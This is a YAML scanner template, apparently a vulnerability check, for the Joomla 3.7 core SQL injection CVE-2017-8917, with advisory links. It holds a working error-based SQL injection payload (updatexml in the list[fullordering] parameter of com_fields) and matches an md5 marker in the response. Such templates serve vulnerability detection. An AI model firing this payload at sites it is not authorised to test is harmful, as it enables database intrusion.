name: yaml-poc-joomla-joomla-sql_injection-CVE-2017-8917
binding: 1a399f61-bd55-424b-9d85-8d2a328c5bca
detail:
    author: system_user
    links:
        - http://www.securityfocus.com/bid/98515
        - http://www.securitytracker.com/id/1038522
        - https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
        - https://developer.joomla.org/security-centre/692-20170501-core-sql-injection.html
        - https://www.exploit-db.com/exploits/42033/
        - https://www.exploit-db.com/exploits/44358/
        - https://www.joomla.org/announcements/release-news/5705-joomla-3-7-1-release.html
    vulnerability:
        id: 546d4a75-12ae-4cf2-a977-333afee35c8d
        level: critical
transport: http
set:
    r1: randomInt(10000000, 50000000)
    r2: md5(string(r1))
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,md5({{r1}})),1)
        expression: response.body.bcontains(bytes(substr(r2, 4, 31)))
expression: r0()
